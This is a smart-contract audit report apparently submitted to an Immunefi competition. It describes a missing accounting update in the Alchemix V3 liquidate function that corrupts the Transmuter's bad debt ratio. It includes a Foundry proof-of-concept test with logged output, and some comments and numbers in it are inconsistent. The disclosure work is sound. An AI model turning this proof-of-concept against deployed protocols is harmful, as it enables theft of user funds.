# 57963 sc high incorrect mytsharesdeposited accounting in liquidate allows theft of user funds via corrupted bad debt ratio

**Submitted on Oct 29th 2025 at 16:47:31 UTC by @Outliers for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57963
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

During the liquidation process, the Alchemist contract transfers yield tokens (`myt`) to the Transmuter and a fee to the liquidator without updating its internal accounting variable `_mytSharesDeposited`. This omission artificially inflates the system's total collateral value, which in turn corrupts the bad debt calculation in the Transmuter. As a result, during a system insolvency, users would be able to claim more underlying assets than they are entitled to, systematically draining the protocol and pushing the realised losses onto the last users to withdraw.

## Vulnerability Details

The core of the vulnerability is a missing state update in the `liquidate` function of the Alchemist contract. The `_mytSharesDeposited` variable is a critical internal accounting metric that tracks the total amount of yield tokens (`myt`) the Alchemist considers as deposited collateral. This variable is correctly updated in functions like `deposit`, `withdraw`, and `repay`, but is erroneously omitted during liquidations.

When a liquidation occurs, `myt` tokens are transferred out of the Alchemist contract:

1. The majority of the liquidated amount is sent to the Transmuter.
2. A fee is sent to the liquidator.

However, the `_mytSharesDeposited` is not reduced, creating a discrepancy between the contract's actual token balance and its internal ledger.

**Code Snippet from Alchemist (`liquidate` function):**

```solidity
// send liquidation amount - fee to transmuter
TokenUtils.safeTransfer(myt, transmuter, amountLiquidated - feeInYield); // BUG: Tokens sent out, but _mytSharesDeposited is not reduced.

// send base fee to liquidator if available
if (feeInYield > 0 && account.collateralBalance >= feeInYield) {
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield); // BUG: Tokens sent out, but _mytSharesDeposited is not reduced.
}
// MISSING: _mytSharesDeposited -= (amountLiquidated);
```

This inflated `_mytSharesDeposited` value directly impacts the calculation of `_getTotalUnderlyingValue()`, which is used to determine the overall health of the system.

**Code Snippet from Alchemist (`_getTotalUnderlyingValue` function):**

```solidity
function _getTotalUnderlyingValue() internal view returns (uint256 totalUnderlyingValue) {
    uint256 yieldTokenTVLInUnderlying = convertYieldTokensToUnderlying(_mytSharesDeposited); // BUG: Uses inflated value
    totalUnderlyingValue = yieldTokenTVLInUnderlying;
}
```

The miscalculated `totalUnderlyingValue` is then passed to the Transmuter's bad debt ratio calculation. This ratio determines how much users can claim when the system is under-collateralized. An inflated `totalUnderlyingValue` makes the system appear healthier than it is, leading to an incorrect (lower) `badDebtRatio`.

**Code Snippet from Transmuter (simplified logic):**

```solidity
uint256 denominator = alchemist.getTotalUnderlyingValue() + ...;
uint256 badDebtRatio = alchemist.totalSyntheticsIssued() * 1e18 / denominator;

uint256 scaledTransmuted = amountTransmuted;
if (badDebtRatio > 1e18) {
    // Users' claims are correctly scaled down only if badDebtRatio > 1.
    scaledTransmuted = amountTransmuted * 1e18 / badDebtRatio;
}
```

Because the `badDebtRatio` is artificially low due to the inflated denominator, the condition `badDebtRatio > 1e18` may never be met, or the scaling factor applied may be insufficient. Consequently, users can claim a disproportionately large amount of underlying assets relative to the protocol's actual collateral, effectively draining it.

## Impact Details

The impact of this vulnerability is **theft of yield/protocol fees** and **direct theft of user funds**, leading to a **loss of user funds without a reasonable limit**.

1. **Incorrect Accounting:** The Alchemist's reported getTotalUnderlyingValue is permanently inflated, misleading users and external integrators about the protocol's solvency.
2. **Corrupted Insolvency Process:** In a worst-case scenario where the system becomes under-collateralised (bad debt exists), the Transmuter will miscalculate the user's share of the remaining collateral.
3. **Systematic Drainage:** Users transmuting their synthetic tokens will receive more underlying assets than they are entitled to. This will systematically drain the Transmuter's reserves (both its `myt` balance and any underlying assets redeemed from the Alchemist), leaving later users with nothing.
4. **Magnitude of Loss:** The loss is not capped. It is proportional to the amount of `myt` liquidated without proper accounting. In a mass liquidation event, the accounting error could become very large, leading to a near-total drain of the protocol's collateral and a complete breakdown of the transmutation mechanism.

## References

1. **Alchemist Liquidate Function:** The function where `myt` tokens are transferred out without updating `_mytSharesDeposited`.

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L874-L880>

2. **Alchemist `_getTotalUnderlyingValue` Function:** The function that uses the inflated `_mytSharesDeposited` to report TVL.

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L1239>

3. **Transmuter Bad Debt Calculation:** The logic that relies on the Alchemist's `getTotalUnderlyingValue()` to determine user payouts during insolvency.

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/Transmuter.sol#L217-L226>

## Proof of Concept

## Proof of Concept

Add this helper function to transmuter.sol

```solidity
   function baddebtratio() external view returns (uint256) {           
        // Ratio of total synthetics issued by the alchemist / underlingying value of collateral stored in the alchemist
        // If the system experiences bad debt we use this ratio to scale back the value of yield tokens that are transmuted
        uint256 yieldTokenBalance = TokenUtils.safeBalanceOf(alchemist.myt(), address(this));
        // Avoid divide by 0
        uint256 denominator = alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) > 0 ? alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) : 1;
        uint256 badDebtRatio = alchemist.totalSyntheticsIssued() * 10**TokenUtils.expectDecimals(alchemist.underlyingToken()) / denominator;

         return badDebtRatio;
         }

          function baddebtratio2() external view returns (uint256) {           
       
// when alchemist holds 0 myt test ratio one should be 1 1 should be a large vaule

        uint256 yieldTokenBalance = TokenUtils.safeBalanceOf(alchemist.myt(), address(this));
        // Avoid divide by 0
        uint256 denominator = alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) > 0 ? 0 + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) : 1;
        uint256 badDebtRatio = alchemist.totalSyntheticsIssued() * 10**TokenUtils.expectDecimals(alchemist.underlyingToken()) / denominator;

         return badDebtRatio;
         }

           function baddebtratio3() external view returns (uint256) {           
    
  // when alchemist holds 0 myt test ratio one should be 1 1 should be a large vaule

        uint256 yieldTokenBalance = TokenUtils.safeBalanceOf(alchemist.myt(), address(this));
        // Avoid divide by 0
        uint256 denominator = alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) > 0 ? alchemist.getTotalUnderlyingValue() + 0 : 1;
        uint256 badDebtRatio = alchemist.totalSyntheticsIssued() * 10**TokenUtils.expectDecimals(alchemist.underlyingToken()) / denominator;

         return badDebtRatio;
         }
```

```solidity

 function letsee() external view returns (uint256) {
    return TokenUtils.safeBalanceOf(myt, address(transmuter));}

     function letsee2() external view returns (uint256) {
    return TokenUtils.safeBalanceOf(myt, address(this));}

function bal(uint256 tokenId) external view returns (uint256) {

    return  _accounts[tokenId].collateralBalance ;
}


function lockedbal(uint256 tokenId) external view returns (uint256) {

    return  _accounts[tokenId].rawLocked ;
}




```

```solidity
  function testLiquidate_Full_Liquidation_Globally_Undercollateralized12345() external {
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint debt123 = alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(tokenIdFor0xBeef, debt123, address(0xbeef));
        vm.stopPrank();

      
        uint256 transmuterPreviousBalance = IERC20(address(vault)).balanceOf(address(transmuterLogic));

        console.log("myt balance of alchemist:",alchemist.letsee2());

        // modify yield token price via modifying underlying token supply
        (uint256 prevCollateral, uint256 prevDebt,) = alchemist.getCDP(tokenIdFor0xBeef);
    

        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 59 bps or 5.9%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 590 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);


        console.log("Bad debt ratio before:", transmuterLogic.baddebtratio());

        // let another user liquidate the previous user position
        vm.startPrank(externalUser);
        uint256 liquidatorPrevTokenBalance = IERC20(address(vault)).balanceOf(address(externalUser));
        uint256 liquidatorPrevUnderlyingBalance = IERC20(vault.asset()).balanceOf(address(externalUser));

        uint256 alchemistCurrentCollateralization =
            alchemist.normalizeUnderlyingTokensToDebt(alchemist.getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / alchemist.totalDebt();


            console.log("Current collateralization:", alchemistCurrentCollateralization);
            console.log("global collateralization:", alchemist.globalMinimumCollateralization());
        (uint256 liquidationAmount, uint256 expectedDebtToBurn,,) = alchemist.calculateLiquidation(
            alchemist.totalValue(tokenIdFor0xBeef),
            prevDebt,
            alchemist.minimumCollateralization(),
            alchemistCurrentCollateralization,
            alchemist.globalMinimumCollateralization(),
            liquidatorFeeBPS
        );
        uint256 expectedLiquidationAmountInYield = alchemist.convertDebtTokensToYield(liquidationAmount);
        uint256 expectedBaseFeeInYield = 0;

        // Account is still collateralized, but pulling from fee vault for globally bad debt scenario
        uint256 expectedFeeInUnderlying = expectedDebtToBurn * liquidatorFeeBPS / 10_000;

        (uint256 assets, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenIdFor0xBeef);

        (uint256 depositedCollateral, uint256 debt,) = alchemist.getCDP(tokenIdFor0xBeef);

        vm.stopPrank();

        console.log("Bad debt ratio after:", transmuterLogic.baddebtratio());
        console.log("Transmuter manual balance check before debt lock:",alchemist.letsee());
        console.log("Debt amount:",debt123);
        console.log("conversion factor:", alchemist. underlyingConversionFactor());

           vm.startPrank(address(address(0xbeef)));

           alchemist.withdraw( alchemist.bal(tokenIdFor0xBeef), address(0xbeef), tokenIdFor0xBeef);

           vm.stopPrank();

          vm.startPrank(address(address(0xbeef)));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), alchemist.totalSyntheticsIssued());
        transmuterLogic.createRedemption( alchemist.totalSyntheticsIssued());
        vm.stopPrank();

        vm.roll(block.number + 5_256_100);

           // decreasing yeild token suppy by 59 bps or 5.9%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply2 = initialVaultSupply -  (initialVaultSupply * 2090 / 10_000) ;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);


        console.log("tOTAL DEBT ISSUED BEFORE REDEMPTION CLAIM:", alchemist.totalSyntheticsIssued());


          console.log("Bad debt ratio after price change:", transmuterLogic.baddebtratio());
           console.log("myt balance of alchemist during redemption:",alchemist.letsee2());
           console.log("Transmuter manual balance check after debt unlock:",alchemist.letsee());
           console.log("Bad debt2 to show error", transmuterLogic.baddebtratio2());
               console.log("Bad debt3 to show error", transmuterLogic.baddebtratio3());
          


        vm.startPrank(address(address(0xbeef)));
        transmuterLogic.claimRedemption(1);
        vm.stopPrank();

    }
```

Result

```solidity
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testLiquidate_Full_Liquidation_Globally_Undercollateralized12345() (gas: 3310926)
Logs:
  myt balance of alchemist: 200000000000000000000000
  Bad debt ratio before: 953100000000000001
  Current collateralization: 1049207848074703597
  global collateralization: 1111111111111111111
  Bad debt ratio after: 487993446316112846
  Transmuter manual balance check before debt lock: 190620000000000000201675
  Debt amount: 180000000000000000018000
  conversion factor: 1
  tOTAL DEBT ISSUED BEFORE REDEMPTION CLAIM: 180000000000000000018000
  Bad debt ratio after price change: 500000000000000000
  myt balance of alchemist during redemption: 0
  Transmuter manual balance check after debt unlock: 190620000000000000201675
  Bad debt2 to show error 1000000000000000000
  Bad debt3 to show error 1000000000000000000
  Transmuter manual balance check after debt unlock: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.50ms (5.80ms CPU time)

```
